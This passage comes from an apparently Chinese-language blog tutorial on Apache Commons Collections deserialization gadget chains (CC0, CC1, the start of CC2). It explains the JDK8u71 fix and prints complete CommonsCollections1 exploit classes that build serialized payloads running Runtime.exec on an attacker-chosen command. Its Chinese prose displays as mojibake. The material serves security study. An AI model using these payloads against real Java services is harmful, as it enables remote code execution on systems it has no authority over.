class="addition">+        static void setMemberValues(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                                    Map&lt;String, Object&gt; memberValues) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, memberValuesOffset, memberValues);</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p>æ–°ç‰ˆçš„ <code>readObject</code> çš„ä¸»è¦å˜åŒ–ä¸ºï¼š</p>
<ul>
<li><p><strong>ä¸å† <code>defaultReadObject()</code></strong></p>
<p>æ”¹ä¸º <code>ObjectInputStream.GetField fields = s.readFields();</code>ï¼ŒåªæŠŠåºåˆ—åŒ–æµä¸­çš„ä¸¤ä¸ªå­—æ®µä¸´æ—¶è¯»å…¥<strong>å±€éƒ¨å˜é‡</strong> <code>t</code>ï¼ˆtypeï¼‰å’Œ <code>streamVals</code>ï¼ˆmemberValuesï¼‰ï¼Œ<strong>å¹¶æ²¡æœ‰ç»™ <code>this.memberValues</code> èµ‹å€¼</strong>ã€‚</p>
<p>æ—§ç‰ˆå› ä¸º <code>defaultReadObject()</code> çš„å­˜åœ¨ï¼Œæ”»å‡»è€…çš„ <code>TransformedMap</code> ä¼šç«‹åˆ»æˆä¸º <code>this.memberValues</code>ï¼›ç°åœ¨å®ƒåªæ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œä¸ä¼šè¢«â€œæŒä¹…åŒ–â€åˆ°å¯¹è±¡é‡Œã€‚</p>
</li>
<li><p><strong>æ–°å»ºä¸€ä¸ªå¹²å‡€çš„ <code>LinkedHashMap mv</code>ï¼Œåªè¯»å¤åˆ¶</strong></p>
<p>ç”±äºæ–°åˆ›å»ºçš„ <code>Map</code> ä¸ <code>Transformer</code> ç›¸å…³ç»“æ„æ— å…³ï¼Œåˆå§‹åŒ–å®Œæˆåå†ç”¨ <code>Unsafe</code> å†™å› <code>memberValues</code> å­—æ®µï¼Œæ•´ä¸ªè¿‡ç¨‹ä¸ä¼šè§¦å‘ä»»ä½•åˆ©ç”¨é“¾ã€‚</p>
</li>
</ul>
<p>å› æ­¤ CC0 åœ¨ JDK8u71 ä¹‹åå¤±æ•ˆã€‚</p>
<h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)</span><br><span class="line">at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:158)</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:77)</span><br><span class="line">at com.sun.proxy.$Proxy1.entrySet(Unknown Source:-1)</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:444)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’LazyMapï¼‰"><a href="#åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’LazyMapï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’LazyMapï¼‰"></a>åŸç†åˆ†æï¼ˆAnnotationInvocationHandlerâ†’LazyMapï¼‰</h4><p>å‰é¢æåˆ°è¿‡ï¼Œ<code>LazyMap</code> ä¿®é¥°è¿‡çš„ <code>Map</code> åªè¦è°ƒç”¨ <code>get</code> æ–¹æ³•å°±ä¼šè§¦å‘ <code>transform</code> æ–¹æ³•ã€‚ç„¶è€Œ <code>AnnotationInvocationHandler.readObject</code> å¹¶æ²¡æœ‰è°ƒç”¨ <code>get</code> æ–¹æ³•ã€‚</p>
<p>ä¸è¿‡å¹¸è¿çš„æ˜¯ <code>AnnotationInvocationHandler</code> å®ç°äº† <code>InvocationHandler</code> æ¥å£ï¼Œå› æ­¤ <code>AnnotationInvocationHandler</code> æœ¬èº«æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†æ¥å£å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦æˆ‘ä»¬æŠŠä¸€ä¸ª <code>Map</code> ç”¨ <code>AnnotationInvocationHandler</code> ä»£ç†ï¼Œé‚£ä¹ˆä»£ç†åçš„ <code>Map</code> çš„ä»»ä½•æ–¹æ³•è°ƒç”¨éƒ½ä¼šæ‰§è¡Œåˆ° <code>AnnotationInvocationHandler</code> çš„ <code>invoke</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure></div>

<p><code>AnnotationInvocationHandler</code> çš„ <code>invoke</code> æ–¹æ³•ç‰¹åˆ¤å‡ ç§æ–¹æ³•åä¼šè°ƒç”¨ <code>memberValues</code> çš„ <code>get</code> æ–¹æ³•ï¼Œä¹Ÿå°±ä¼šè§¦å‘ <code>LazyMap</code> çš„ <code>transform</code> æ–¹æ³•è°ƒç”¨ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName(); <span class="comment">// è·å–æ–¹æ³•çš„åç§°</span></span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); <span class="comment">// è·å–æ–¹æ³•çš„å‚æ•°ç±»å‹</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤„ç† Object å’Œ Annotation çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]); <span class="comment">// è°ƒç”¨è‡ªå®šä¹‰çš„ equals å®ç°</span></span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>); <span class="comment">// å¦‚æœå‚æ•°ä¸ä¸º0ï¼ŒæŠ›å‡ºæ–­è¨€é”™è¯¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl(); <span class="comment">// è°ƒç”¨è‡ªå®šä¹‰çš„ toString å®ç°</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl(); <span class="comment">// è°ƒç”¨è‡ªå®šä¹‰çš„ hashCode å®ç°</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type; <span class="comment">// è¿”å›æ³¨è§£çš„ç±»å‹</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤„ç†æ³¨è§£æˆå‘˜çš„è®¿é—®å™¨</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member); <span class="comment">// ğŸ‘ˆ ä» memberValues ä¸­è·å–å¯¹åº”æˆå‘˜çš„å€¼ï¼Œè¿™é‡Œè°ƒç”¨äº† get æ–¹æ³•ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// è¿”å›æœ€ç»ˆçš„ç»“æœ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-1"><a href="#åˆ©ç”¨ä»£ç ï¼ˆCC3-CC4ï¼‰-1" class="headerlink" title="åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰"></a>åˆ©ç”¨ä»£ç ï¼ˆCC3&#x2F;CC4ï¼‰</h4>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ä»£ç†ä¹‹åä»»ä½•å¯¹ <code>proxyMap</code> çš„æ“ä½œéƒ½ä¼šè§¦å‘ <code>transformer</code> è°ƒç”¨ï¼Œå› æ­¤éœ€è¦æœ€åè®¾ç½®æ¶æ„çš„ <code>Transformer</code>ã€‚</p>

    </div>
  </div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>commons-collections4 åªæ˜¯å°† <code>LazyMap.decorate</code> æ›´æ”¹ä¸º <code>LazyMap.lazyMap</code>ï¼Œå…¶ä½™ä¸å˜ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="ä¿®å¤æƒ…å†µï¼ˆâ‰¤-JDK8u71ï¼‰-1"><a href="#ä¿®å¤æƒ…å†µï¼ˆâ‰¤-JDK8u71ï¼‰-1" class="headerlink" title="ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰"></a>ä¿®å¤æƒ…å†µï¼ˆâ‰¤ JDK8u71ï¼‰</h4><p>ç”±äº CC1 å’Œ CC0 ä¸€æ ·éƒ½æ˜¯é€šè¿‡ <code>AnnotationInvocationHandler#memberValues</code> è§¦å‘ï¼Œå› æ­¤é’ˆå¯¹ CC0 çš„è¡¥ä¸å¯¹ CC1 åŒæ ·æœ‰æ•ˆï¼ŒCC1 ä¹Ÿåœ¨ JDK8u71 ä¹‹åå¤±æ•ˆã€‚</p>
<h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.commons.collections4.functors.ChainedTransformer.transform(ChainedTransformer.java:111)</span><br><span class="line">at org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)</span><br><span class="line">at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)</span><br><span class="line">at java.util.PriorityQueue.siftDown(PriorityQueue.java:687)</span><br><span class="line">at java.util.PriorityQueue.heapify(PriorityQueue.java:736)</span><br><span class="line">at java.util.PriorityQueue.readObject(PriorityQueue.java:795)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æï¼ˆPriorityQueueâ†’TransformingComparatorï¼‰"><a href="#åŸç†åˆ†æï¼ˆPriorityQueueâ†’TransformingComparatorï¼‰" class="headerlink" title="åŸç†åˆ†æï¼ˆPriorityQueueâ†’TransformingComparatorï¼‰"></a>åŸç†åˆ†æï¼ˆPriorityQueueâ†’TransformingComparatorï¼‰</h4><p>å‰é¢æåˆ°ï¼Œ<code>TransformingComparator</code> åœ¨æ¯”è¾ƒæ—¶ä¼šå¯¹æ¯”è¾ƒçš„å¯¹è±¡è°ƒç”¨ <code>transform</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è€Œ Java ä¸­å†…ç½®çš„ç»´æŠ¤é¡ºåºçš„å®¹å™¨å¦‚ <code>PriorityQueue</code> åœ¨ååºåˆ—åŒ–æ—¶ä¼šå¯¹å†…éƒ¨çš„å…ƒç´ è¿›è¡Œæ’åºï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­åœ¨ <code>siftDownUsingComparator</code> å‡½æ•°å†…æ¶‰åŠäº†å…ƒç´ å¤§å°çš„æ¯”è¾ƒã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td 